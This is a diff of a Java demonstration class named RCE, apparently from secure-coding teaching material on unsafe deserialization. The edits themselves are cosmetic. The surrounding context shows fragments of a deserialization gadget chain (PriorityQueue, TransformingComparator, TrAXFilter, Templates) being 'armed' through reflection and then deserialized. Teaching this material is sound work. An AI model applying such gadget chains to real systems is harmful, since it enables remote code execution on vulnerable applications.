@@ -1,6 +1,6 @@
 // The MIT License (MIT)
 //
-// Copyright (c) 2022 Robert C. Seacord
+// Copyright (c) 2025 Robert C. Seacord
 //
 // Permission is hereby granted, free of charge, to any person obtaining a copy
 // of this software and associated documentation files (the "Software"), to deal
@@ -23,7 +23,6 @@
 package ser05j;
 
 import javax.xml.transform.Templates;
-
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -74,10 +73,10 @@ public class RCE {
 
     // create queue with numbers
     PriorityQueue<Object> queue = new PriorityQueue<>(2, new TransformingComparator<>(chain));
-    queue.add(1);
-    queue.add(1);
+      queue.add(1);
+      queue.add(1);
 
-    // swap in values to arm
+      // swap in values to arm
     Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
     paramTypes[0] = Templates.class;
     args[0] = templates;
@@ -93,7 +92,7 @@ public class RCE {
     return obj;
   }
 
-  public static void main(String[] args)  {
+  static void main(String[] ignoredArgs)  {
     try {
       @SuppressWarnings("unused") Object obj = deserialize(RCEpayload());
       System.out.println("DoS has been deserialized.");
